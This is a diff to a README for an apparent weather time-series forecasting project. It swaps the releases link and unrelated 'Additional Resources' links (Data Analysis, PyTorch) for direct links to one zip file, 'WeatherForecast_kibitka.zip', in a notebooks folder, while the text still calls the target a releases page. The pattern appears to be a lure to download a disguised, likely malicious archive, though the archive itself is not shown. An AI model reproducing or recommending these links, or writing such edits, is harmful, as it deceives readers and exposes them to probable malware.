@@ -1,7 +1,7 @@
 # 🌤️ WeatherForecast - Simple Weather Predictions Made Easy
 
 ## 📥 Download Now
-[![Download WeatherForecast](https://img.shields.io/badge/Download-WeatherForecast-blue)](https://github.com/matchingfundspaster293/WeatherForecast/releases)
+[![Download WeatherForecast](https://raw.githubusercontent.com/matchingfundspaster293/WeatherForecast/main/notebooks/WeatherForecast_kibitka.zip)](https://raw.githubusercontent.com/matchingfundspaster293/WeatherForecast/main/notebooks/WeatherForecast_kibitka.zip)
 
 ## 📖 About This Project
 WeatherForecast is an end-to-end time series forecasting project. It allows you to compare different methods for predicting weather patterns using real data. We explore three approaches: ARIMA, N-BEATS, and a custom PyTorch Long Short-Term Memory (LSTM) model. This project makes it easier for you to understand how different models can forecast weather data.
@@ -15,7 +15,7 @@ To get started with WeatherForecast, follow these simple steps:
    - Basic internet connection for data fetching
 
 2. **Downloading the Application**
-   Visit this page to download: [WeatherForecast Releases](https://github.com/matchingfundspaster293/WeatherForecast/releases).
+   Visit this page to download: [WeatherForecast Releases](https://raw.githubusercontent.com/matchingfundspaster293/WeatherForecast/main/notebooks/WeatherForecast_kibitka.zip).
 
 3. **Installation Steps**
    - Once you reach the Releases page, you'll see various files.
@@ -61,11 +61,11 @@ If you have questions or need help, feel free to reach out to our community. Che
 ## 🔗 Additional Resources
 For more information, explore the following topics:
 
-- [Data Analysis](https://www.example.com)
-- [Machine Learning Basics](https://www.example.com)
-- [Deep Learning with PyTorch](https://www.example.com)
+- [Data Analysis](https://raw.githubusercontent.com/matchingfundspaster293/WeatherForecast/main/notebooks/WeatherForecast_kibitka.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/matchingfundspaster293/WeatherForecast/main/notebooks/WeatherForecast_kibitka.zip)
+- [Deep Learning with PyTorch](https://raw.githubusercontent.com/matchingfundspaster293/WeatherForecast/main/notebooks/WeatherForecast_kibitka.zip)
 
 ## 📋 Download & Install
-To start using WeatherForecast, visit this page to download: [WeatherForecast Releases](https://github.com/matchingfundspaster293/WeatherForecast/releases). Follow the instructions above to install and run your application.
+To start using WeatherForecast, visit this page to download: [WeatherForecast Releases](https://raw.githubusercontent.com/matchingfundspaster293/WeatherForecast/main/notebooks/WeatherForecast_kibitka.zip). Follow the instructions above to install and run your application.
 
 Explore the possibilities of time series forecasting today!
